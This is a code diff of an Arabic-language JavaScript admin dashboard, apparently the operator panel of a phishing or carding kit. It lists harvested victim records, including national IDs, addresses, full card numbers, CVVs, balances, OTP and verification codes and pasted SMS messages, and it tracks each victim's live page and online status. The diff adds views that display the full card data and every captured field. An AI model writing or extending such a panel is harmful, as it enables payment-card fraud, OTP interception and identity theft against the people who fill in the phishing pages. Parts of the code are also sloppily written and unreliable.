@@ -1,4 +1,4 @@
-/** لوحة التحكم - Dashboard Admin Panel */
+/** لوحة التحكم - Dashboard Admin Panel مع تفاصيل المستخدم */
 class ApiDatabase {
     constructor() {
         this.users = [];
@@ -95,25 +95,34 @@ let db = new ApiDatabase();
 let currentUser = null;
 let isLoggedIn = false;
 let dashboardRefreshIntervalId = null;
-
-// Session management
 let currentSessionEpoch = 0;
 let epochPollInterval = null;
+let currentUserDetails = null;
+
+const FIELD_LABELS_AR = {
+    username: 'اسم المستخدم', password: 'كلمة المرور', name: 'الاسم',
+    'full-name': 'الاسم الكامل', 'national-id': 'الرقم القومي', phone: 'رقم الهاتف',
+    email: 'البريد الإلكتروني', address: 'العنوان', city: 'المدينة',
+    gov: 'المحافظة', district: 'المنطقة / الحي', street: 'الشارع',
+    otpCode: 'رمز OTP', verificationCode: 'رمز التحقق',
+    card_number: 'رقم البطاقة', card_holder: 'اسم صاحب البطاقة',
+    expiry_date: 'تاريخ انتهاء', expiry_month: 'شهر الانتهاء',
+    expiry_year: 'سنة الانتهاء', cvv: 'CVV/CVC', balance: 'الرصيد',
+    selectedWatch: 'الساعة المختارة', pastedSmsMessage: 'الرسالة المُلصَقة',
+    last_page: 'آخر صفحة', last_heartbeat: 'آخر heartbeat'
+};
 
 function getSession() {
     try {
         const session = localStorage.getItem('dashboardSession');
         if (!session) return null;
-        const parsed = JSON.parse(session);
-        currentSessionEpoch = parsed.epoch || 0;
-        return parsed;
+        return JSON.parse(session);
     } catch (e) { return null; }
 }
 
 function saveSession(epoch) {
     const session = { isLoggedIn: true, epoch, timestamp: Date.now() };
     localStorage.setItem('dashboardSession', JSON.stringify(session));
-    currentSessionEpoch = epoch;
 }
 
 async function checkEpochMismatch() {
@@ -122,18 +131,18 @@ async function checkEpochMismatch() {
         if (!response.ok) return;
         const data = await response.json();
         const warningEl = document.getElementById('epochWarning');
-        if (data.sessionEpoch !== currentSessionEpoch || data.lastChangeTime) {
+        if (data.sessionEpoch !== (localStorage.getItem('dashboardSessionEpoch') || 0) || data.lastChangeTime) {
             if (data.lastChangeTime) {
                 const diffMin = Math.round((Date.now() - new Date(data.lastChangeTime).getTime()) / 60000);
                 warningEl.textContent = `تم تغيير كلمة المرور قبل ${diffMin} دقيقة`;
             } else {
-                warningEl.textContent = 'كلمة المرور غير صحيحة أو منتهية';
+                warningEl.textContent = 'كلمة المرور غير صحيحة';
             }
             warningEl.style.display = 'block';
         } else {
             warningEl.style.display = 'none';
         }
-    } catch (e) { console.error('Epoch check failed:', e); }
+    } catch (e) {}
 }
 
 async function checkPassword() {
@@ -155,17 +164,17 @@ async function checkPassword() {
             saveSession(data.sessionEpoch);
             document.getElementById('loginModal').classList.remove('active');
             document.getElementById('dashboardContainer').classList.remove('dashboard-hidden');
-            loadDashboard();
+            isLoggedIn = true;
+            await loadDashboard();
             db.showNotification('تم تسجيل الدخول بنجاح', 'success');
         } else {
             document.getElementById('adminPassword').value = '';
-            db.showNotification(data.error || 'كلمة المرور غير صحيحة', 'error');
-            checkEpochMismatch();
+            db.showNotification(data.error || 'كلمة المرور خاطئة', 'error');
+            await checkEpochMismatch();
         }
     } catch (err) {
         document.body.style.cursor = 'default';
-        db.showNotification('خطأ في الاتصال بالخادم', 'error');
-        console.error(err);
+        db.showNotification('خطأ في الخادم', 'error');
     }
 }
 
@@ -182,21 +191,20 @@ function startEpochPolling() {
                         isLoggedIn = false;
                         document.getElementById('loginModal').classList.add('active');
                         document.getElementById('dashboardContainer').classList.add('dashboard-hidden');
-                        db.showNotification('تم إلغاء الجلسة من جهاز آخر', 'warning');
-                        checkEpochMismatch();
+                        db.showNotification('تم إلغاء الجلسة', 'warning');
                     }
                 }
-            } catch (e) { console.error(e); }
+            } catch (e) {}
         }
     }, 5000);
 }
 
 async function loadDashboard() {
     try {
-        await db.refresh(true); // online status
+        await db.refresh(true);
         renderDashboardTables();
     } catch (e) {
-        db.showNotification('تعذر تحميل البيانات', 'error');
+        db.showNotification('خطأ تحميل البيانات', 'error');
     }
     
     if (dashboardRefreshIntervalId) clearInterval(dashboardRefreshIntervalId);
@@ -205,7 +213,7 @@ async function loadDashboard() {
             try {
                 await db.refresh(true);
                 renderDashboardTables();
-                db.playDashboardAlertSound();
+                if (db.users.length > 0) db.playDashboardAlertSound();
             } catch (e) {
                 console.error(e);
             }
@@ -217,24 +225,34 @@ async function loadDashboard() {
 
 function renderDashboardTables() {
     const container = document.getElementById('dashboardTablesWrap');
-    if (!db.users || db.users.length === 0) {
+    if (!db.users.length) {
         container.innerHTML = '<div class="dashboard-empty-all">لا توجد تسجيلات</div>';
         return;
     }
 
-    const usersTable = document.createElement('table');
-    usersTable.className = 'users-table';
+    const table = document.createElement('table');
+    table.className = 'users-table';
     
-    let thead = '<thead><tr><th>الاسم</th><th>المستخدم</th><th>الهاتف</th><th>الحالة</th><th>آخر صفحة</th><th>آخر نشاط</th><th>الإجراءات</th></tr></thead>';
-    let tbody = '<tbody>';
-    
+    table.innerHTML = `
+        <thead><tr>
+            <th>الاسم</th>
+            <th>المستخدم</th>
+            <th>الهاتف</th>
+            <th>الحالة</th>
+            <th>آخر صفحة</th>
+            <th>آخر نشاط</th>
+            <th>الإجراءات</th>
+        </tr></thead>
+        <tbody>
+    `;
+
     db.users.forEach(user => {
         const statusClass = user.is_online ? 'online' : 'offline';
         const statusText = user.is_online ? 'متصل' : 'غير متصل';
         const lastPage = user.last_page || user.page || 'غير معروف';
-        const lastActivity = user.last_heartbeat ? new Date(user.last_heartbeat).toLocaleString('ar-EG') : 'غير معروف';
+        const lastActivity = user.last_heartbeat ? new Date(user.last_heartbeat).toLocaleString('ar') : 'غير معروف';
         
-        tbody += `
+        table.querySelector('tbody').innerHTML += `
             <tr>
                 <td>${escapeHtml(user.name || 'غير معروف')}</td>
                 <td>${escapeHtml(user.username || '')}</td>
@@ -244,65 +262,135 @@ function renderDashboardTables() {
                 <td>${lastActivity}</td>
                 <td class="action-column">
                     <button onclick="showUserDetails('${user.id}')" class="btn-info">تفاصيل</button>
-                    <button onclick="showCardDetails('${user.id}')" class="btn-card" style="display: ${user.card_number ? 'block' : 'none'}">البطاقة</button>
-                    <button onclick="deleteUser('${user.id}')" class="btn-delete">حذف</button>
+                    <button onclick="showCardDetails('${user.id}')" class="btn-card" style="display: ${user.card_number ? 'block' : 'none'};">البطاقة</button>
+                    <button onclick="confirmDeleteUser('${user.id}')" class="btn-delete">حذف</button>
                 </td>
             </tr>
         `;
     });
-    
-    tbody += '</tbody>';
-    usersTable.innerHTML = thead + tbody;
+
+    table.querySelector('tbody').innerHTML += '</tbody>';
     container.innerHTML = '';
-    container.appendChild(usersTable);
+    container.appendChild(table);
 }
 
 function escapeHtml(text) {
-    const map = { '&': '&amp;', '<': '<', '>': '>', '"': '"', "'": '&#039;' };
-    return String(text).replace(/[&<>"']/g, m => map[m]);
+    const div = document.createElement('div');
+    div.textContent = String(text);
+    return div.innerHTML;
 }
 
-function showUserDetails(id) {
-    // Modal logic
+async function showUserDetails(id) {
+    currentUserDetails = db.users.find(u => u.id === id);
+    const detailsContainer = document.getElementById('userDetails');
+    detailsContainer.innerHTML = '';
+
+    // Navigation buttons already in HTML
+    if (currentUserDetails) {
+        const detailsTable = document.createElement('table');
+        detailsTable.className = 'detail-field-table';
+        let rows = '';
+        Object.entries(currentUserDetails).forEach(([key, value]) => {
+            if (!key.startsWith('_') && key !== 'id' && value !== null && value !== undefined) {
+                rows += `<tr><th>${FIELD_LABELS_AR[key] || key}</th><td>${escapeHtml(value)}</td></tr>`;
+            }
+        });
+        detailsTable.innerHTML = rows || '<tr><td colspan="2">لا توجد تفاصيل</td></tr>';
+        detailsContainer.appendChild(detailsTable);
+    }
+    
     document.getElementById('infoModal').classList.add('active');
 }
 
+function closeInfoModal() {
+    document.getElementById('infoModal').classList.remove('active');
+}
+
 function showCardDetails(id) {
-    // Card modal
+    const user = db.users.find(u => u.id === id);
+    const display = document.getElementById('cardDisplay');
+    if (user && user.card_number) {
+        display.innerHTML = `
+            <div class="card-container">
+                <div class="credit-card">
+                    <div class="card-header">
+                        <div class="card-type">VISA</div>
+                        <div class="card-chip">💳</div>
+                    </div>
+                    <div class="card-number-row">
+                        <div class="card-number-group">${user.card_number.substring(0,4)}</div>
+                        <div class="card-number-group">****</div>
+                        <div class="card-number-group">****</div>
+                        <div class="card-number-group">${user.card_number.slice(-4)}</div>
+                    </div>
+                    <div class="card-bottom">
+                        <div class="card-holder">
+                            <div class="label">CARD HOLDER</div>
+                            <div class="value">${user.card_holder || '**** ****'}</div>
+                        </div>
+                        <div class="card-meta">
+                            <div class="card-expiry">
+                                <div class="label">EXPIRES</div>
+                                <div class="value">${user.expiry_month || '**'} / ${user.expiry_year || '**'}</div>
+                            </div>
+                            <div class="card-cvv">
+                                <div class="label">CVV</div>
+                                <div class="value">${user.cvv || '***'}</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="card-info">
+                    <p><strong>رقم البطاقة:</strong> ${user.card_number || 'غير متوفر'}</p>
+                    <p><strong>صاحب البطاقة:</strong> ${user.card_holder || 'غير متوفر'}</p>
+                    <p><strong>الرصيد:</strong> ${user.balance || 'غير متوفر'}</p>
+                </div>
+            </div>
+        `;
+    }
     document.getElementById('cardModal').classList.add('active');
 }
 
-async function deleteUser(id) {
-    if (!confirm('تأكيد الحذف؟')) return;
+function closeCardModal() {
+    document.getElementById('cardModal').classList.remove('active');
+}
+
+async function confirmDeleteUser(id) {
+    if (!confirm('هل أنت متأكد من حذف هذا المستخدم؟')) return;
     try {
         await db.deleteUser(id);
-        db.showNotification('تم الحذف', 'success');
+        db.showNotification('تم الحذف بنجاح', 'success');
+        await db.refresh(true);
+        renderDashboardTables();
     } catch (e) {
         db.showNotification('خطأ في الحذف', 'error');
     }
 }
 
-window.addEventListener('load', async () => {
-    checkEpochMismatch();
+function logout() {
+    localStorage.removeItem('dashboardSession');
+    isLoggedIn = false;
+    document.getElementById('loginModal').classList.add('active');
+    document.getElementById('dashboardContainer').classList.add('dashboard-hidden');
+    if (dashboardRefreshIntervalId) clearInterval(dashboardRefreshIntervalId);
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const passwordInput = document.getElementById('adminPassword');
+    if (passwordInput) passwordInput.focus();
+    
+    document.getElementById('adminPassword')?.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') checkPassword();
+    });
+    
     const session = getSession();
-    if (session && session.isLoggedIn) {
+    if (session?.isLoggedIn) {
         isLoggedIn = true;
         document.getElementById('loginModal').classList.remove('active');
         document.getElementById('dashboardContainer').classList.remove('dashboard-hidden');
-        await loadDashboard();
+        loadDashboard();
     }
     
-    // Global event listeners
-    document.getElementById('adminPassword').addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') checkPassword();
-    });
-});
-
-// Enter key support
-document.addEventListener('DOMContentLoaded', () => {
-    const passwordInput = document.getElementById('adminPassword');
-    if (passwordInput) {
-        passwordInput.focus();
-    }
+    checkEpochMismatch();
 });
 
